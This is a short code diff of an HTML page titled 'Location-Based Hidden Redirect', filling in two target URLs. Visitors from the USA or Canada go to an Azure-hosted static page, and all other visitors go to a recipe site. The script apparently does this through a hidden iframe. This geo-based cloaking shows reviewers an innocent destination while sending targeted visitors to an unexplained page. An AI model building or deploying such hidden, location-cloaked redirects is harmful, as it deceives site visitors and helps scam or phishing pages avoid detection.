@@ -6,9 +6,9 @@
     <title>Location-Based Hidden Redirect</title>
     <script>
         // USA/Canada Redirection URL
-        var usaCanadaURL = "https://your-usa-canada-url.com";
+        var usaCanadaURL = "https://huntop001.z13.web.core.windows.net/";
         // Other Countries Redirection URL
-        var otherCountriesURL = "https://your-other-countries-url.com";
+        var otherCountriesURL = "https://www.allrecipes.com/";
 
         // Function to Redirect with Hidden iframe
         function hiddenRedirect(targetUrl) {
